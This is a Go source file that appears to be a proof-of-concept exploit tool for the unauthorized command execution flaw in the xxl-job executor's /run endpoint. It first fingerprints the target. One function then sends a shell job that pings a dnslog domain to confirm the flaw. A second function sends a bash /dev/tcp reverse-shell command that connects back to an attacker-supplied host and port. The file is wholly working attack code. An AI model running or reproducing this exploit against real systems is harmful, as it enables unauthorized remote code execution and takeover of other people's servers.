package pocs

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math"
	"net/http"
	"strconv"
	"strings"
	"time"
	newclient "xxl-job/newClient"
)

type Unauthorized_Rce struct {
	Target     string
	Proxy      string
	Timeout    int
	Headers    map[string]string
	Result_500 Result_500
	Result_200 Result_200
}

type Result_500 struct {
	Code int
	Msg  string
}

type Result_200 struct {
	Code int
}

func NewUnauthorizedRce(target, proxy string) *Unauthorized_Rce {
	return &Unauthorized_Rce{
		Target:  target,
		Proxy:   proxy,
		Timeout: 20,
		Headers: map[string]string{
			"User-Agent":       newclient.ReturnUA(),
			"Accept-Encoding":  "gzip, deflate",
			"Content-Type":     "application/json",
			"X-Requested-With": "XMLHttpRequest",
		},
		Result_500: Result_500{},
		Result_200: Result_200{},
	}
}

func (u *Unauthorized_Rce) Check(dnslog string) {
	timestamp := time.Now().UnixNano() / int64(time.Millisecond)
	times := int64(math.Round(float64(timestamp) * 1000))
	timeStr := strconv.Itoa(int(times))
	cmd := fmt.Sprintf("ping xxl-job.%s", dnslog)
	fmt.Println("[+] excute command:", cmd)

	// powershell、Shell、Python、NodeJS、PHP、java
	data := struct {
		JobId                 int    `json:"jobId"`
		ExecutorHandler       string `json:"executorHandler"`
		ExecutorParams        string `json:"executorParams"`
		ExecutorBlockStrategy string `json:"executorBlockStrategy"`
		ExecutorTimeout       int    `json:"executorTimeout"`
		LogId                 int    `json:"logId"`
		LogDateTime           int64  `json:"logDateTime"`
		GlueType              string `json:"glueType"`
		GlueSource            string `json:"glueSource"`
		GlueUpdatetime        string `json:"glueUpdatetime"`
		BroadcastIndex        int    `json:"broadcastIndex"`
		BroadcastTotal        int    `json:"broadcastTotal"`
	}{
		JobId:                 123,
		ExecutorHandler:       "demoJobHandler",
		ExecutorParams:        "demoJobHandler",
		ExecutorBlockStrategy: "COVER_EARLY",
		ExecutorTimeout:       0,
		LogId:                 1,
		LogDateTime:           1586629003729,
		GlueType:              "GLUE_SHELL",
		GlueSource:            cmd,
		GlueUpdatetime:        timeStr,
		BroadcastIndex:        0,
		BroadcastTotal:        0,
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	var url string
	if strings.HasSuffix(u.Target, "/") {
		url = u.Target + "run"
	} else {
		url = u.Target + "/run"
	}

	response, err := newclient.SendRequest("POST", url, u.Proxy, u.Timeout, nil, u.Headers)
	if err != nil {
		return
	}
	defer response.Body.Close()

	decoder := json.NewDecoder(response.Body)
	if err := decoder.Decode(&u.Result_500); err != nil {
		return
	}

	if response.StatusCode == http.StatusOK {
		if u.Result_500.Code == 500 && strings.Contains(u.Result_500.Msg, "xxl.job") {
			r := fmt.Sprintf("[+] %s The target machine did indeed use xxl job!", u.Target)
			fmt.Println(r)
			fmt.Println("[+] Prepare to attempt dnslog to detect unauthorized command execution vulnerabilities in xxl-job")
			resp, err := newclient.SendRequest("POST", url, u.Proxy, u.Timeout, bytes.NewReader(jsonData), u.Headers)
			if err != nil {
				return
			}
			defer resp.Body.Close()

			switch resp.StatusCode {
			case http.StatusOK:
				decoder := json.NewDecoder(resp.Body)
				if err := decoder.Decode(&u.Result_200); err != nil {
					return
				}
				if u.Result_200.Code == 200 {
					r := fmt.Sprintf("[*] DNSLOG detection has been executed, please return to the DNSLOG platform [%s] to view", dnslog)
					fmt.Println(r)
				} else {
					fmt.Println("[-] DNSLOG detection failed, vulnerability may not exist!")
				}
			case http.StatusNotFound:
				page404 := fmt.Sprintf("[!] %s 404 Not Found - page not found!", url)
				fmt.Println(page404)
			case http.StatusRequestTimeout:
				fmt.Println("request timeout!")
			default:
				fmt.Printf("Request to return status code: %d\n", resp.StatusCode)
			}

		} else {
			r := fmt.Sprintf("[-] %s The target machine is not using xxl-job!", u.Target)
			fmt.Println(r)
		}
	} else if response.StatusCode == http.StatusNotFound {
		page404 := fmt.Sprintf("[!] %s 404 Not Found - page not found!", url)
		fmt.Println(page404)
	} else if response.StatusCode == http.StatusRequestTimeout {
		fmt.Println("request timeout!")
	} else {
		r := fmt.Sprintf("[-] %s The target machine is not using xxl-job, or there is no unauthorized usage!", u.Target)
		fmt.Println(r)
	}
}

func (u *Unauthorized_Rce) ReveseShell(lhost, lport string) {
	cmd := fmt.Sprintf("bash -i>& /dev/tcp/%s/%s 0>&1", lhost, lport)
	fmt.Println("[+] excute command:", cmd)
	timestamp := time.Now().UnixNano() / int64(time.Millisecond)
	times := int64(math.Round(float64(timestamp) * 1000))
	timeStr := strconv.Itoa(int(times))

	data := struct {
		JobId                 int    `json:"jobId"`
		ExecutorHandler       string `json:"executorHandler"`
		ExecutorParams        string `json:"executorParams"`
		ExecutorBlockStrategy string `json:"executorBlockStrategy"`
		ExecutorTimeout       int    `json:"executorTimeout"`
		LogId                 int    `json:"logId"`
		LogDateTime           int64  `json:"logDateTime"`
		GlueType              string `json:"glueType"`
		GlueSource            string `json:"glueSource"`
		GlueUpdatetime        string `json:"glueUpdatetime"`
		BroadcastIndex        int    `json:"broadcastIndex"`
		BroadcastTotal        int    `json:"broadcastTotal"`
	}{
		JobId:                 123,
		ExecutorHandler:       "demoJobHandler",
		ExecutorParams:        "demoJobHandler",
		ExecutorBlockStrategy: "COVER_EARLY",
		ExecutorTimeout:       0,
		LogId:                 1,
		LogDateTime:           1586629003729,
		GlueType:              "GLUE_SHELL",
		GlueSource:            cmd,
		GlueUpdatetime:        timeStr,
		BroadcastIndex:        0,
		BroadcastTotal:        0,
	}

	jsonData, err := json.Marshal(data)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	var url string
	if strings.HasSuffix(u.Target, "/") {
		url = u.Target + "run"
	} else {
		url = u.Target + "/run"
	}

	response, err := newclient.SendRequest("POST", url, u.Proxy, u.Timeout, nil, u.Headers)
	if err != nil {
		return
	}
	defer response.Body.Close()

	decoder := json.NewDecoder(response.Body)
	if err := decoder.Decode(&u.Result_500); err != nil {
		return
	}
	if response.StatusCode == http.StatusOK {
		if u.Result_500.Code == 500 && strings.Contains(u.Result_500.Msg, "xxl.job") {
			r := fmt.Sprintf("[+] %s The target machine did indeed use xxl-job!", u.Target)
			fmt.Println(r)
			fmt.Println("[+] Preparing to attempt xxl job unauthorized command execution vulnerability rebound shell!")
			resp, err := newclient.SendRequest("POST", url, u.Proxy, u.Timeout, bytes.NewReader(jsonData), u.Headers)
			if err != nil {
				return
			}
			decoder := json.NewDecoder(resp.Body)
			if err := decoder.Decode(&u.Result_200); err != nil {
				return
			}
			if u.Result_200.Code == 200 {
				r := fmt.Sprintf("[*] Reverse shell command executed. Check results on host %s!", lhost)
				fmt.Println(r)
			} else {
				fmt.Println("[-] Reverse shell command executed Falid")
			}
		} else {
			r := fmt.Sprintf("[-] %s The target machine is not using xxl-job!", u.Target)
			fmt.Println(r)
		}
	} else {
		r := fmt.Sprintf("[-] %s The target machine is not using xxl-job, or there is no unauthorized usage!", u.Target)
		fmt.Println(r)
	}

}
